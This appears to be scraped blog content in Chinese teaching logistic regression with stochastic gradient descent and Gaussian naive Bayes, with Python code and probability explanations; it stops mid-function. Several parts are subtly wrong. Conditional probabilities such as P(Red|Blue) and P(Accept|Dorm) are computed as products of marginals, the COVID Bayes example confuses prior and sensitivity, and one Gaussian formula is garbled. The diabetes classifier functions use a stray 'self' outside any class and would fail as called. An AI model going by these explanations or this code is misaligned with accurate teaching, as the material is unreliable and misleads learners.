这里可以使用我随机梯度下降来估计训练数据的系数值。随机梯度下降需要两个参数：\n学习率 Learning rate：用于限制每个系数每次更新时的修正量。 Epochs：更新系数时遍历训练数据的次数。 在每个epoch更新训练数据中每一行的每个系数。系数会根据模型产生的错误进行更新，误差为预期输出与预测值之间的差异。错误会随着epoch增加而减少\n将每个都加权，并且这些系数以一致的方式进行更新，用公式可以表示为\nb1(t+1) = b1(t) + learning_rate * (y(t) - p(t)) * p(t) * (1 - p(t)) * x1(t) 那么整合一起为\nfrom math import exp # 预测函数 def predict(row, coefficients): p = coefficients[0] for i in range(len(row)-1): p += coefficients[i + 1] * row[i] return 1.0 / (1.0 + exp(-p)) def coefficients_sgd(train, l_rate, n_epoch): coef = [0.0 for i in range(len(train[0]))] # 初始一个系数，第一次为都为0 for epoch in range(n_epoch): sum_error = 0 for row in train: p = predict(row, coef) # 错误为预期值与实际值直接差异 error = row[-1] - p sum_error += error**2 # 截距没有输入变量x，这里为row[0] coef[0] = coef[0] + l_rate * error * p * (1.0 - p) for i in range(len(row)-1): # 其他系数更新 coef[i + 1] = coef[i + 1] + l_rate * error * p * (1.0 - p) * row[i] print('\u0026gt;epoch=%d, lrate=%.3f, error=%.3f' % (epoch, l_rate, sum_error)) return coef # Calculate coefficients dataset = [ [2.7810836,2.550537003,0], [1.465489372,2.362125076,0], [3.396561688,4.400293529,0], [1.38807019,1.850220317,0], [3.06407232,3.005305973,0], [7.627531214,2.759262235,1], [5.332441248,2.088626775,1], [6.922596716,1.77106367,1], [8.675418651,-0.242068655,1], [7.673756466,3.508563011,1] ] l_rate = 0.3 n_epoch = 100 coef = coefficients_sgd(dataset, l_rate, n_epoch) print(coef) # \u0026gt;epoch=92, lrate=0.300, error=0.024 # \u0026gt;epoch=93, lrate=0.300, error=0.024 # \u0026gt;epoch=94, lrate=0.300, error=0.024 # \u0026gt;epoch=95, lrate=0.300, error=0.023 # \u0026gt;epoch=96, lrate=0.300, error=0.023 # \u0026gt;epoch=97, lrate=0.300, error=0.023 # \u0026gt;epoch=98, lrate=0.300, error=0.023 # \u0026gt;epoch=99, lrate=0.300, error=0.022 #[-0.8596443546618897, 1.5223825112460005, -2.218700210565016] 这里跟踪了跟踪每个epoch误差平方的总和，以便我们可以在每个epoch中打印出error，实例中使用 0.3 学习率并训练100 个 epoch，每个epoch会打印出其误差平方，最终会打印总系数集\n套用真实数据集 糖尿病数据集 是根据基本的医疗信息，预测印第安人5年内患糖尿病的情况。这是一个二元分类，阴性0与阳性1直接的关系。采用了二项式分布，也可以采用其他分布，如高斯等。\nfrom random import seed from random import randrange from csv import reader from math import exp # Load a CSV file def load_csv(filename): dataset = list() with open(filename, 'r') as file: csv_reader = reader(file) for row in csv_reader: if not row: continue dataset.append(row) return dataset # Convert string column to float def str_column_to_float(dataset, column): for row in dataset: row[column] = float(row[column].strip()) # 找到最小和最大的 def dataset_minmax(dataset): minmax = list() for i in range(len(dataset[0])): col_values = [row[i] for row in dataset] value_min = min(col_values) value_max = max(col_values) minmax.append([value_min, value_max]) return minmax # 归一化 def normalize_dataset(dataset, minmax): for row in dataset: for i in range(len(row)): row[i] = (row[i] - minmax[i][0]) / (minmax[i][1] - minmax[i][0]) # k-folds CV实现 def cross_validation_split(dataset, n_folds): dataset_split = list() dataset_copy = list(dataset) fold_size = int(len(dataset) / n_folds) for i in range(n_folds): fold = list() while len(fold) \u0026lt; fold_size: index = randrange(len(dataset_copy)) fold.append(dataset_copy.pop(index)) dataset_split.append(fold) return dataset_split # 计算准确度百分比 def accuracy_metric(actual, predicted): correct = 0 for i in range(len(actual)): if actual[i] == predicted[i]: correct += 1 return correct / float(len(actual)) * 100.0 # 使用CV评估算法 def evaluate_algorithm(dataset, algorithm, n_folds, *args): folds = cross_validation_split(dataset, n_folds) scores = list() for fold in folds: train_set = list(folds) train_set.remove(fold) train_set = sum(train_set, []) test_set = list() for row in fold: row_copy = list(row) test_set.append(row_copy) row_copy[-1] = None predicted = algorithm(train_set, test_set, *args) actual = [row[-1] for row in fold] accuracy = accuracy_metric(actual, predicted) scores.append(accuracy) return scores # 使用系数进行预测 def predict(row, coefficients): yhat = coefficients[0] for i in range(len(row)-1): yhat += coefficients[i + 1] * row[i] return 1.0 / (1.0 + exp(-yhat)) # 系数生成 def coefficients_sgd(self, train, l_rate, n_epoch): \u0026quot;\u0026quot;\u0026quot; 生成系数 :param train: list, 数据集，可以是训练集 :param l_rate: float, 学习率 :param n_epoch:int，epoch，这里代表进行多少次迭代 :return: None \u0026quot;\u0026quot;\u0026quot; coef = [0.0 for i in range(len(train[0]))] # 初始一个系数，第一次为都为0 for epoch in range(n_epoch): sum_error = 0 for row in train: p = self.predict(row, coef) # 错误为预期值与实际值直接差异 error = row[-1] - p sum_error += error**2 # 截距没有输入变量x，这里为row[0] coef[0] = coef[0] + l_rate * error * p * (1.0 - p) for i in range(len(row)-1): # 其他系数更新 coef[i + 1] = coef[i + 1] + l_rate * error * p * (1.0 - p) * row[i] # print('\u0026gt;epoch=%d, lrate=%.3f, error=%.3f' % (epoch, l_rate, sum_error)) return coef # 随机梯度下降的逻辑回归算法 def logistic_regression(self, train, test, l_rate, n_epoch): predictions = list() coef = self.coefficients_sgd(train, l_rate, n_epoch) for row in test: p = self.predict(row, coef) p = round(p) predictions.append(p) return(predictions) seed(1) # 数据预处理 filename = 'pima-indians-diabetes.csv' dataset = load_csv(filename) for i in range(len(dataset[0])): str_column_to_float(dataset, i) # 做归一化 minmax = dataset_minmax(dataset) normalize_dataset(dataset, minmax) # evaluate algorithm n_folds = 5 l_rate = 0.1 n_epoch = 100 scores = evaluate_algorithm(dataset, logistic_regression, n_folds, l_rate, n_epoch) print('Scores: %s' % scores) print('Mean Accuracy: %.3f%%' % (sum(scores)/float(len(scores)))) # 0.35294117647058826 # Scores: [73.8562091503268, 78.43137254901961, 81.69934640522875, 75.81699346405229, 75.81699346405229] # Mean Accuracy: 77.124% 上述是对整个数据集的预测百分比，也可以对对应的类的信息进行输出\nReference Maximum likelihood estimation\nSigmoid Function\nlogistic\nbinary logistic regression\nLR implementation\n","permalink":"https://www.oomkill.com/2022/06/logistic-regression/","summary":"","title":"逻辑回归"},{"content":"什么是naive bayes 朴素贝叶斯 naive bayes，是一种概率类的机器学习算法，主要用于解决分类问题\n为什么被称为朴素贝叶斯？\n为什么被称为朴素，难道仅仅是因为贝叶斯很天真吗？实际上是因为，朴素贝叶斯会假设数据属性之间具有很强的的独立性。即该模型中的所有属性彼此之间都是独立的，改变一个属性的值，不会直接影响或改变算法中其他的属性的值\n贝叶斯定理 了解朴素贝叶斯之前，需要掌握一些概念才可继续\n条件概率 Conditional probability：在另一个事件已经发生的情况下，另外一个时间发生的概率。如，==在多云天气，下雨的概率是多少？== 这是一个条件概率 联合概率 Joint Probability：计算两个或多个事件同时发生的可能性 边界概率 Marginal Probability：事件发生的概率，与另一个变量的结果无关 比例 Proportionality 贝叶斯定理 Bayes' Theorem：概率的公式；贝叶斯定律是指根据可能与事件的先验概率描述了事件的后验概率 边界概率 边界概率是指事件发生的概率，可以认为是无条件概率。不以另一个事件为条件；用公式表示为 $P(X)$ 如：抽到的牌是红色的概率是 $P(red) = 0.5$ ；\n联合概率 联合概率是指两个事件在同一时间点发生的可能性，公式可以表示为 $P(A \\cap B)$\nA 和 B 是两个不同的事件相同相交，$P(A \\and B)$ $P(A,B)$ = A 和 B 的联合概率\n概率用于处理事件或现象发生的可能性。它被量化为介于 0 和 1 之间的数字，其中 0 表示不可能发生的机会，1 表示事件的一定结果。\n如，从一副牌中抽到一张红牌的概率是 $\\frac{1}{2}$。这意味着抽到红色和抽到黑色的概率相同；因为一副牌中有52张牌，其中 26 张是红色的，26 张是黑色的，所以抽到一张红牌与抽到一张黑牌的概率是 50%。\n而联合概率是对测量同时发生的两个事件，只能应用于可能同时发生多个情况。例如，从一副52张牌扑克中，拿起一张既是红色又是6的牌的联合概率是 $P(6\\cap red) = \\frac{2}{52} = \\frac{1}{26}$ ；这个是怎么得到的呢？因为抽到红色的概率为50%，而一副牌中有两个红色6（红桃6，方片6），而6和红色是两个独立的概率，那么计算公式就为：$P(6 \\cap red) = P(6) \\times P(red) = \\frac{4}{52} \\times \\frac{26}{52} = \\frac{1}{26}$\n在联合概率中 $ \\cap $ 称为交集，是事件 A 与 事件 B 发生的概率的相交点，通过图来表示为：两个圆的相交点，即6和红色牌共同的部分\n条件概率 条件概率是指事件发生的可能性，基于先有事件的结果的发生乘后续事件概率来计算的，例如，申请大学的通过率为80%，宿舍仅提供给60%学生使用，那么这个人被大学录取并提供宿舍的概率是多少？\n$P(accept\\ and\\ get\\ dorm) = P(Accept|Dorm) = P(Accept) \\times P(Dorm) = 0.8 \\times 0.6 = 0.48$\n条件概率将会考虑两个事件之间的关系，例如你被大学录取的概率， 以及为你提供宿舍的概率；条件概率中的关键点：\n另一个事件发生的情况下，这件事发生的几率 表示为，给定 B 的概率 A 发生的概率，用公式表示为：$P(A|B)$，其中 A 取决于 B 发生的概率 通过例子了解条件概率 上述大致上了解到了：条件概率取决于先前的结果，那么通过几个例子来熟悉条件概率\n例1：袋子里有红色，蓝色，绿色三颗玻璃球，每种被拿到的概率相等，那么摸到蓝色之后再摸到红色的条件概率是多少？\n这里需要先得到摸到蓝色的概率：$P(Blue) = \\frac{1}{3}$ 因为只有三种可能性 现在还剩下两颗玻璃球 红色和蓝色，那么摸到红色的概率为：$P(Red) = \\frac{1}{2}$ 因为只有两种可能性 那么已经摸到蓝色在摸到红色的概率为 $P(Red|Blue) = \\frac{1}{3} \\times \\frac{1}{2} = \\frac{1}{6}$ 例2：色子摇出5的概率为 $\\frac{1}{6}$ 那么在结果是奇数里摇出5 那么可能就是 $\\frac{1}{3}$，而这个奇数就是另外的一个条件，因为只有3个奇数，其中一个是5，那么在奇数中，抛出5的概率就是 $\\frac{1}{3}$。\n通过上述信息可知，B 作为附带条件修饰 A 发生的概率，称为给定 B ，A 发生的条件，用$P(A|B)$ 表示。那么可以的出：\n给定A，B发生的概率为，A和B的发生概率排除掉A的概率，即 $P(B|A) = \\frac{P(A \\cap B)}{P(A)} $ 联合概率和条件概率的区别 条件概率是一个事件在另一个事件发生的情况下的概率：$P(X\\ given\\ Y)$ 公式为： $P(X∣Y)$；即一个事件发生的概率取决于另一事件的发生；如：从一副牌中，假设你抽到一张红牌，那么抽到6的概率是 $\\frac{1}{13}$；因为26张红牌中仅有两张为6，用公式表示：$P(6|red) = \\frac{2}{26}$\n联合概率仅考虑两个事件发生的可能性，对比与条件概率可用于计算联合概率：$P(X \\cap Y) = P(X|Y) \\times P(Y)$\n通过合并上述例子得到，同时抽到6和红色的概率为：$\\frac{1}{26}$\n贝叶斯定理 贝叶斯定理是确定条件概率的数学公式。贝叶斯定理依赖于先验概率分布以计算后验概率。\n后验概率和先验概率 先验概率 prior probability：在收集新数据之前发送事件的概率 后验概率 posterior probability：得到新的数据来修正之前事件发生的概率；换句话说是后验概率是在事件 B 已经发生的情况下，事件 A 发生的概率。 例，从一副52 张牌中抽取一张牌，那么这张牌是K的概率是 $\\frac{4}{52}$ , 因为一副牌中有4张K；假设抽中的牌是一张人物牌，那么抽到是K的概率则是 $\\frac{4}{12}$；因为一副牌中有12张人物牌。那么贝叶斯定理的公式为：\n$P(A|B) = \\frac{P(A \\cap B)}{P(B)}$，$P(B|A) = \\frac{P(B \\cap A)}{P(A)}$ $P(A \\cap B)$，$P(B \\cap A)$ A和B同时发生和B和A同时发生时相等的 $P(B \\cap A) = P(B|A) \\times P(A)$ $P(A \\cap B) = P(A|B) \\times P(B)$ 那么根据上面的公式，已知 $P(A \\cap B) = P(B \\cap A)$ 可推导出公式： 因为 $P(B \\cap A) = P(A \\cap B)$ ，那么 $P(B|A) \\times P(A) = P(A|B) \\times P(B)$ 那么吧 $P(A)$ 放置等式右边即 $P(B|A) = \\frac{P(A|B) \\times P(B)}{P(A)}$ 那么最终 Formula for Bayes 为 $P(B|A) = \\frac{P(A|B) \\times P(B)}{P(A)}$ 其中：\n$P(A)$：A 的边界概率\n$P(B)$：B 的边界概率\n$P(A|B)$ ：条件概率，已知 B，A 的概率\n$P(B|A)$ ：条件概率，已知 A，B 的概率\n$P(B \\cap A)$：联合概率 B 与 A 同时发生的概率\n一个简单的概率问题可能会问：茅台股价下跌的概率是多少？条件概率通过询问这个问题更进一步：鉴于A股平均指数下跌，茅台股价下跌的概率是多少？ 给定 B 已经发生的条件下 A 的概率可以表示为：\n$P(Mao|AS) = \\frac{P(Mao \\cap AS)}{P(AS)}$\n$P(Mao \\cap AS)$ 是 A 和 B 同时发生的概率，与 A 发生的情况下 B 也发生的概率 乘 A 发生的概率相等表示为： $P(Mao) \\times P(AS|Mao)$；这两个表达式相等，也就是贝叶斯定理，可以表示为：\n如果， $P(Mao \\cap AS) = P(Mao) \\times P(AS|Mao)$ 那么， $P(Mao|AS) = \\frac{P(Mao) \\times P(AS|Mao)}{P(AS)}$ $P(Mao)$ 和 $P(AS)$ 分别为茅台和A股的下跌概率，彼此间没有关系\n一般情况下，都是以 x （输入） y （输出） 在函数中，假设 $x=AS$ , $y=MAO$ 那么替代到公式中就 $P(Y|X) = \\frac{P(X|Y) \\times P(Y)}{P(X)}$\n朴素贝叶斯算法 朴素贝叶斯不是一个的算法，而是一组算法，所有这些算法都基于一个共同的原则，即每一对被分类的特征必须相互独立。朴素贝叶斯是一个基本的贝叶斯称呼，包含三种算法的集合：多项式 Multinomial、 伯努利 Bernoulli、高斯 Gaussian。\n伯努利 伯努利朴素贝叶斯，又叫做二项式，只接受二进制值，简而言之，在伯努利中必须计算每个值的二进制出现特征，即一个单词是与否出现在文档中。\n通俗地来说，伯努利有两个互斥的结果：$$NB=\\begin{cases} P(X=1)\\ = \\ q\\ P(X=0)\\ = \\ 1-q\\ \\end{cases} $$ ，在伯努利中，可以有多个特征，但每个特征都假设为是二进制的变量，因此，需要将样本表示为二进制向量。\n那么扩展出的公式为：$P(A|B) = \\frac{P(B|A) \\times P(A)}{P(A) \\times P(B|A) + P(not A) \\times P(B|not A)}$\n例子：假设COVID-19测试并不准确，有**95%**几率在感染时测试出阳性（敏感性），这就意味着如果有人并未感染的概率是相同的（特异性）；问：如果Jeovanna检测为阳性，那么他感染COVID-19的概率是多少？\n敏感性和特异性是医学用语；敏感性，病人测出阳性的比例，特异性，非病人测试阴性的比例\n一般情况下没有更多的信息来确定Jeovanna是否感染，如驻留场所，是否发烧，丧失味觉等。就需要更多的信息来计算Jeovanna感染率，比如预估Jeovanna感染率为1%，这1%就是先验概率。\n此时有100000人的测试样本，预计1000人感染（先验1%），那么就是99000为感染，又因为测试具有 95% 的敏感性和 95% 的特异性，这代表了 1000的95% 和 99000的5% 是阳性。整理一个表格\nHas COVID-19 Do not Has COVID-19 count 阳性 950 4950 5900 阴性 50 94050 94100 那么可以看出，阳性的人并感染COVID-19的概率是，$\\frac{950}{5900} = 16%$ ；那么也就是Jeovanna有16%几率是感染 COVID-19。\n此时将先验概率设置为16%，那么爱丽丝得COVID-19的可能性为：\n$P(B|A)$ ：在95%成功率情况下又获得了阳性\n$P(A)$：阳性的检测成功率\n已知，$P(B|A) = 0.16$ ，$P(A) = 0.95$\n$P(A|B) = \\frac{P(B|A) \\times P(A)}{P(A) \\times P(B|A) + P(not A) \\times P(B|not A)} = \\frac{0.16\\times0.95}{0.95\\times 0.16 + (1-0.95)\\times(1-0.16)}= \\frac{0.152}{0.194} = 0.7835 = 78.35%$\n那么就可以得知，在阳性情况下感染COVID-19的情况下，再去检测会有78%几率阳性\n多项式 多项式朴素贝叶斯是基于多项分布的朴素叶贝斯，用来处理文本，计算 $d$ 在 $c$ 中的概率计算如下：\n$P(c|d) \\ \\propto P(c) \\prod_{i=1}^n\\ P(t_k|c)$\n通俗来说就是二项式的一个变种，是计算多个不同的实例\n$P(t_k|c)$ 是 $t_k$ 的 条件概率，发生在数据集 $c$ 中，$P(t_k|c)$ 解释为 $t_k$ 有多少证据表明 $c$ 是正确的；$P(c)$ 是先验条件 $t1..\\ t2..\\ t3..\\ tn_d$ 中的标记 $d$，它们是我们用于分类的词汇表的一部分，$n_d$ 是 标记 $d$ 的数量。\n例如：\u0026ldquo;Peking and Taipei join the WTO\u0026rdquo;，$\u0026lt;Peking,\\ Taipei,\\ join,\\ WTO\u0026gt;$ ,那么 $n_d = 4$\n那么可以简化为，\n$P(c=x|d=c_k) = P(c^1=x^1..,\\ c^2=x^2..,\\ c^n=x^n|d=c_k) = \\prod_{i=1}^n(c^i|d)x^i + (1-P(c^i|d))\t(1-x^i)$\n$\\prod_{i=1}^n$ 连乘积，即从下标起乘到上标\n朴素贝叶斯实现 首先将朴素贝叶斯为 5 个部分：\n分类 数据集汇总 按类别汇总数据 高斯密度函数 分类概率 分类 根据数据所属的类别来计算数据的概率，即所谓的基本率。\n先创建一个字典对象，其中每个键都是类值，然后添加所有记录的列表作为字典中的值。\n假设每行中的最后一列是类型。\n# 按类拆分数据集，返回结构是一个词典 def separate_by_class(dataset): separated = dict() for i in range(len(dataset)): vector = dataset[i] class_value = vector[-1] # dataset最后一行是类别 if (class_value not in separated): separated[class_value] = list() separated[class_value].append(vector) return separated 准备一些数据集\nX1\tX2\tClass 3.393533211\t2.331273381\t0 3.110073483\t1.781539638\t0 7.423436942\t4.696522875\t1 1.343808831\t3.368360954\t0 3.582294042\t4.67917911\t0 9.172168622\t2.511101045\t1 7.792783481\t3.424088941\t1 2.280362439\t2.866990263\t0 5.745051997\t3.533989803\t1 7.939820817\t0.791637231\t1 测试分类函数的功能\ndef separate_by_class(dataset): separated = dict() for i in range(len(dataset)): vector = dataset[i] class_value = vector[-1] if (class_value not in separated): separated[class_value] = list() separated[class_value].append(vector) return separated # 测试数据集 dataset = [ [3.393533211,2.331273381,0], [3.110073483,1.781539638,0], [1.343808831,3.368360954,0], [7.423436942,4.696522875,1], [3.582294042,4.67917911,0], [9.172168622,2.511101045,1], [7.792783481,3.424088941,1], [2.280362439,2.866990263,0], [5.745051997,3.533989803,1], [7.939820817,0.791637231,1] ] separated = separate_by_class(dataset) for label in separated: print(label) for row in separated[label]: print(row) 可以看到分类是成功的\n数据集汇总 现在需要对给出数据集的两个数据进行统计，如何对指定数据集做概率计算？需要以下几步\n计算数据集两个数据的平均值和标准差\n平均值为： $\\frac{sum(x)}{n} \\times count(x)$ ；其中 $x$ 为正在查找值的列表\nmean函数用于计算平均值\ndef mean(numbers): return sum(numbers) / float(len(numbers)) 样本标准差的计算方式为平均值的平均差。公式可以为 sqrt((sum i to N (x_i – mean(x))^2) / N-1)\n函数用来计算\nfrom math import sqrt # Calculate the standard deviation of a list of numbers def stdev(numbers): avg = mean(numbers) # 平均值 variance = sum([(x-avg)**2 for x in numbers]) / float(len(numbers)-1) return sqrt(variance) 还需要对每个数据的每一列计算平均值和标准偏差统计量。通过将每列的所有值收集到一个列表中并计算该列表的平均值和标准差。计算完成后，将统计信息收集到数据汇总的列表或元组中。然后，对数据集中的每一列重复此操作并返回统计元组列表。\n下面是 数据汇总的函数 summarise_dataset()用来统计每列列表的平均值和标准差\nfrom math import sqrt # 计算平均数 def mean(numbers): return sum(numbers)/float(len(numbers)) # 计算标准差 def stdev(numbers): # 标准差 avg = mean(numbers) # 计算平均值 variance = sum([(x-avg)**2 for x in numbers]) / float(len(numbers)-1) # 计算所有的平方 return sqrt(variance) # 数据汇总 def summarize_dataset(dataset): summaries = [(mean(column), stdev(column), len(column)) for column in zip(*dataset)] del(summaries[-1]) # 因为分类不需要所以。删除掉分类哪行 return summaries # Test summarizing a dataset dataset = [ [3.393533211,2.331273381,0], [3.110073483,1.781539638,0], [1.343808831,3.368360954,0], [3.582294042,4.67917911,0], [2.280362439,2.866990263,0], [7.423436942,4.696522875,1], [5.745051997,3.533989803,1], [9.172168622,2.511101045,1], [7.792783481,3.424088941,1], [7.939820817,0.791637231,1]] summary = summarize_dataset(dataset) print(summary) 这里使用的是zip() 函数，将每列作为提供的参数。使用 * 作为位置函数，运将数据集传递给 zip() ，这个运算会将每一行的分割为单独列表。然后zip() 遍历每一行的每个元素，返回一列作为数字列表。\n然后计算每列中的平均数、标准差和行数。删掉不需要的列（第三列类别列的平均数，标准差和行数）\n可以看到\n[ (5.178333386499999, 2.7665845055177263, 10), (2.9984683241, 1.218556343617447, 10) ] 根据类别汇总数据 separate_by_class() 是将数据分成行，现在要编写一个 summarise_dataset()；是先计算每列的统计汇总信息，然后在按照子集分类（X1，X2）\n# 按类拆分数据集 def summarize_by_class(dataset): separated = separate_by_class(dataset) summaries = dict() for class_value, rows in separated.items(): summaries[class_value] = summarize_dataset(rows) return summaries 这是完整的代码\nfrom math import sqrt # 计算平均数 def mean(numbers): return sum(numbers)/float(len(numbers)) # 计算标准差 def stdev(numbers): # 标准差 avg = mean(numbers) # 计算平均值 variance = sum([(x-avg)**2 for x in numbers]) / float(len(numbers)-1) # 计算所有的平方 return sqrt(variance) # 数据汇总 def summarize_dataset(dataset): summaries = [(mean(column), stdev(column), len(column)) for column in zip(*dataset)] del(summaries[-1]) # 因为分类不需要所以。删除掉分类哪行 return summaries # 按类进行数据汇总 def summarize_by_class(dataset): separated = separate_by_class(dataset) summaries = dict() for class_value, rows in separated.items(): summaries[class_value] = summarize_dataset(rows) return summaries # 测试数据集 dataset = [ [3.393533211,2.331273381,0], [3.110073483,1.781539638,0], [1.343808831,3.368360954,0], [3.582294042,4.67917911,0], [2.280362439,2.866990263,0], [7.423436942,4.696522875,1], [5.745051997,3.533989803,1], [9.172168622,2.511101045,1], [7.792783481,3.424088941,1], [7.939820817,0.791637231,1]] summary = summarize_by_class(dataset) for label in summary: print(label) for row in summary[label]: print(row) 按照分类，对每列计算平均值和标准差\n高斯分布函数 高斯分布 Gaussian distribution 可以用两个数字来概括，高斯分布是具有对称的钟形的分布，所以中心右侧是左侧的镜像，曲线下的面积代表概率，曲线总面积之和等于1。\n高斯分布中的大多数连续数据值倾向于围绕均值聚集，值离均值越远，那么它发生的可能性就越小。接近但从未完全贴合x 轴。\n高斯分布由均值和标准差两个参数决定的，任何点 (x) 都可以通过公式 $z = \\frac{x-mean}{standard\\ deviation}$ 来计算\nReference\nnormal distribution\n通过这一点，就可以知道就可以计算出给定的概率，公式为：\n$P({x_i}|Y) = \\frac{1}{\\sqrt2\\pi\\sigma_y^2}exp(-(\\frac{(x_i-\\mu_y)^2}{2\\sigma_y^2})$\n其中，$\\sigma$ 为标准差，$\\mu$ 为平均值，那么转换为可读懂的公式为：\n$f(x) = \\frac{1}{\\sqrt{(2 \\times pi )}\\times sigma} \\times exp(-(\\frac{(x-mean)^2}{(2 \\times sigma)^2}))$\n其中，sigma是 x 的标准差，mean 是 x 的平均值，PI是 就是 $\\pi$ math.pi 的值。\n那么在转换成python中的代码为：\nf(x) = (1 / sqrt(2 * PI) * sigma) * exp(-((x-mean)^2 / (2 * sigma^2))) 那么用python实现一个函数，来实现高斯公式\n# 计算高斯分布的函数，需要三个参数，x 平均值，标准差 def calculate_probability(x, mean, stdev): exponent = exp(-((x-mean)**2 / (2 * stdev**2 ))) return (1 / (sqrt(2 * pi) * stdev)) * exponent 这里通过函数测试三个数据，(0,1,1)， (1,1,1)，(2,1,1)\nfrom math import sqrt from math import pi from math import exp # 计算高斯分布的函数，需要三个参数，x 平均值，标准差 def calculate_probability(x, mean, stdev): exponent = exp(-((x-mean)**2 / (2 * stdev**2 ))) return (1 / (sqrt(2 * pi) * stdev)) * exponent print(calculate_probability(1.0, 1.0, 1.0)) print(calculate_probability(2.0, 1.0, 1.0)) print(calculate_probability(0.0, 1.0, 1.0)) 这里可以看到结果，(1,1,1) 的概率最可能（三个值中趋于钟形顶部）\n分类概率 到这里，可以尝试通过测试数据来统计新数据的概率，这里每个类别的概率都是单独计算的，这里将简化概率计算公式 $P(class|data) = P(data|class) \\times P(class)$；这是一个常见的简化，这将意味着将结果为最大值的类的计算作为预测结果。因为通常对预测感兴趣，而不是概率\n对于上述例子，有两个变量，这里以 class=0 的类别来说明，公式为：\n$P(class=0|X1,X2) = P(X1|class=0) \\times P(X2|class=0) \\times P(class=0)$\n编写一个聚合函数，将上述四个步骤汇总处理，\n# Example of calculating class probabilities from math import sqrt from math import pi from math import exp # 拆分数据集 def separate_by_class(dataset): separated = dict() for i in range(len(dataset)): vector = dataset[i] class_value = vector[-1] if (class_value not in separated): separated[class_value] = list() separated[class_value].append(vector) print(separated) return separated # 计算平均数 def mean(numbers): return sum(numbers)/float(len(numbers)) # 计算标准差 def stdev(numbers): avg = mean(numbers) # 计算平均值 variance = sum([(x-avg)**2 for x in numbers]) / float(len(numbers)-1) # 标准差 return sqrt(variance) # 数据汇总 def summarize_dataset(dataset): summaries = [(mean(column), stdev(column), len(column)) for column in zip(*dataset)] del(summaries[-1]) return summaries # 按类进行数据汇总 def summarize_by_class(dataset): separated = separate_by_class(dataset) summaries = dict() for class_value, rows in separated.items(): summaries[class_value] = summarize_dataset(rows) return summaries # 计算高斯分布的函数，需要三个参数，x 平均值，标准差 def calculate_probability(x, mean, stdev): exponent = exp(-((x-mean)**2 / (2 * stdev**2 ))) return (1 / (sqrt(2 * pi) * stdev)) * exponent # 计算每个分类的概率 def converge_probabilities(summaries, row): # 计算所有分类的个数 total_rows = sum([summaries[label][0][2] for label in summaries]) probabilities = dict() for class_value, class_summaries in summaries.items(): # 计算分类的概率，如这个分类在总分类里概率多少 probabilities[class_value] = summaries[class_value][0][2]/float(total_rows) for i in range(len(class_summaries)): mean, stdev, _ = class_summaries[i] probabilities[class_value] *= calculate_probability(row[i], mean, stdev) return probabilities # 测试数据集 dataset = [ [3.393533211,2.331273381,0], [3.110073483,1.781539638,0], [1.343808831,3.368360954,0], [3.582294042,4.67917911,0], [2.280362439,2.866990263,0], [7.423436942,4.696522875,1], [5.745051997,3.533989803,1], [9.172168622,2.511101045,1], [7.792783481,3.424088941,1], [7.939820817,0.791637231,1]] summaries = summarize_by_class(dataset) probabilities = converge_probabilities(summaries, dataset[0]) print(probabilities) 由结果可以得知，dataset[0] X1 的概率（0.0503）要大于 X2 的概率（0.0001），所以可以正确的判断出 dataset[0] 属于 X1 分类\n鸢尾花(Iris)分类 鸢尾花分类，是模式识别中非常出名的一种数据库，需要先将数据下载：\n关于Iris-databases数据集的说明\niris dataset\n实现开始 实验是根据上述实验的步骤，将朴素贝叶斯算法应用在鸢尾花数据集中，鸢尾花数据集的实验也是需要相同的步骤，只不过对于数据集中的数据还需要一些其他的步骤，大致可分为以下几种操作：\n数据的预处理 从文件中读取数据 将数据类型转换为可用于上面实验的类型（float） 将真实分类转换为数字 int 分类 数据集汇总 按类别汇总数据 高斯密度函数 分类概率 from csv import reader from random import seed from random import randrange from math import sqrt from math import exp from math import pi # 读取数据集 def load_csv(filename): dataset = list() with open(filename, 'r') as file: csv_reader = reader(file) for row in csv_reader: if not row: continue dataset.append(row) return dataset # 将每行的数字转换为float def str_column_to_float(dataset, column): for row in dataset: row[column] = float(row[column].strip()) # 将真实分类转换为数字，按照下标 def str_column_to_int(dataset, column): ''' :param dataset: list, 数据集 :param column: string，是为类型的列要传入 :return: None ''' # 通过循环拿到所有分类 class_values = [row[column] for row in dataset] # 对分类型去重 unique = set(class_values) lookup = dict() # 拿到分类值的key 下标 for i, value in enumerate(unique): lookup[value] = i # 已对应的下标进行替换 for row in dataset: row[column] = lookup[row[column]] return lookup # 将数据的一部分作为训练数据 def cross_validation_split(dataset, n_folds): dataset_split = list() dataset_copy = list(dataset) fold_size = int(len(dataset) / n_folds) for _ in range(n_folds): fold = list() while len(fold) \u0026lt; fold_size: index = randrange(len(dataset_copy)) fold.append(dataset_copy.pop(index)) dataset_split.append(fold) return dataset_split # 计算准确度 def accuracy_metric(actual, predicted): correct = 0 for i in range(len(actual)): if actual[i] == predicted[i]: correct += 1 return correct / float(len(actual)) * 100.0 # 对算法数据进行评估 def evaluate_algorithm(dataset, algorithm, n_folds, *args): \u0026quot;\u0026quot;\u0026quot; :param dataset:list, 原始数据集 :param algorithm:function，算法函数 :param n_folds:int，取多少数据作为训练集 :param args:options ，参数 :return: None \u0026quot;\u0026quot;\u0026quot; folds = cross_validation_split(dataset, n_folds) scores = list() for fold in folds: train_set = list(folds) train_set.remove(fold) # 合并成一个数组 train_set = sum(train_set, []) test_set = list() for row in fold: row_copy = list(row) test_set.append(row_copy) row_copy[-1] = None # 将最后一个类型字段设置为None predicted = algorithm(train_set, test_set, *args) # 真实的类型 actual = [row[-1] for row in fold] # 精确的分数，即这一组数据正确率 accuracy = accuracy_metric(actual, predicted) scores.append(accuracy) print(scores) return scores # 按照分类拆分 def separate_by_class(dataset): separated = dict() for i in range(len(dataset)): vector = dataset[i] class_value = vector[-1] if (class_value not in separated): separated[class_value] = list() separated[class_value].append(vector) return separated # 计算这一系列的平均值 def mean(numbers): return sum(numbers)/float(len(numbers)) # 计算一系列数字的标准差 def stdev(numbers): avg = mean(numbers) variance = sum([(x-avg)**2 for x in numbers]) / float(len(numbers)-1) return sqrt(variance) # 计算数据集中每列的平均值 标准差 长度 def summarize_dataset(dataset): summaries = [(mean(column), stdev(column), len(column)) for column in zip(*dataset)] del(summaries[-1]) return summaries # 按照分类划分数据集 def summarize_by_class(dataset): separated = separate_by_class(dataset) summaries = dict() for class_value, rows in separated.items(): summaries[class_value] = summarize_dataset(rows) return summaries # 计算x的高斯概率 def calculate_probability(x, mean, stdev): \u0026quot;\u0026quot;\u0026quot; :param x:float, 计算这个值的高斯概率 :param mean:float，x的平均值 :param stdev:float，x的标准差 :return: None \u0026quot;\u0026quot;\u0026quot; exponent = exp(-((x-mean)**2 / (2 * stdev**2 ))) return (1 / (sqrt(2 * pi) * stdev)) * exponent # 计算每行的概率 def 